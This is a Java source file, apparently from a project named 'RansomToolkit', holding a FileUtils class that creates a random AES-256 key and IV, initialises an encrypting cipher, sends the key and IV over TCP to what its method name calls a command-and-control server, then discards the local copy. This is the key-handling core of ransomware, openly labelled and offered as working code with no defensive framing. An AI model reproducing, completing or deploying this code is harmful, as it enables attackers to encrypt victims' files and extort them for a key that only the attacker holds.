package com.asef18766.RansomToolkit;

import static javax.crypto.Cipher.ENCRYPT_MODE;

import org.bouncycastle.crypto.BlockCipher;
import org.bouncycastle.crypto.BufferedBlockCipher;
import org.bouncycastle.crypto.CipherParameters;
import org.bouncycastle.crypto.InvalidCipherTextException;
import org.bouncycastle.crypto.engines.RijndaelEngine;
import org.bouncycastle.crypto.modes.CBCBlockCipher;
import org.bouncycastle.crypto.paddings.PKCS7Padding;
import org.bouncycastle.crypto.paddings.PaddedBufferedBlockCipher;
import org.bouncycastle.crypto.params.KeyParameter;
import org.bouncycastle.crypto.params.ParametersWithIV;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.Security;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class FileUtils {
    public static String DEBUG_PREFIX = "RansomToolkit";
    private final int BLK_BIT_SZ = 256;
    private final int BLK_BYTE_SZ = BLK_BIT_SZ / 8;

    private static FileUtils _instance = null;

    private Cipher encryptFunc = null;


    private void SendC2Key(byte[] iv, byte[] key)
    {
        Misc.LogInfo(DEBUG_PREFIX, String.format("aes key:%s", Misc.bytesToHex(key)));
        Misc.LogInfo("f utils", "trying to send aes key");
        TcpClient.GetInstance(null).sendMessage(String.format("%s|%s", Misc.bytesToHex(iv), Misc.bytesToHex(key)));
    }
    private FileUtils() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException {
        Security.addProvider(new BouncyCastleProvider());
        SecureRandom rng = new SecureRandom();

        byte[] key = new byte[256 / 8];
        rng.nextBytes(key);
        byte[] iv = new byte[16];
        rng.nextBytes(iv);

        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        encryptFunc = Cipher.getInstance("AES/CBC/PKCS5Padding");
        encryptFunc.init(ENCRYPT_MODE, keySpec,ivParameterSpec);

        SendC2Key(encryptFunc.getIV(), keySpec.getEncoded());
        keySpec = null;
        System.gc();

        try {
            Misc.LogWarning("crypto", Misc.bytesToHex(encryptFunc.doFinal(new byte[]{4, 8, 7, 6, 33})));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static FileUtils GetInstance() throws InvalidAlgorithmParameterException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, InvalidCipherTextException {
        if (_instance == null)
            _instance = new FileUtils();
        return  _instance;
    }
    public static void main(String[]args)
    {
        TcpClient.GetInstance(new TcpClient.OnMessageReceived() {
            @Override
            public void messageReceived(String message) {
                Misc.LogInfo(DEBUG_PREFIX, String.format("client receive: %s", message));
            }
        });
        try {
            FileUtils.GetInstance();
        }
        catch (Exception e){
            e.printStackTrace();
        }
        Misc.LogWarning(DEBUG_PREFIX, "done of running init task");
    }
}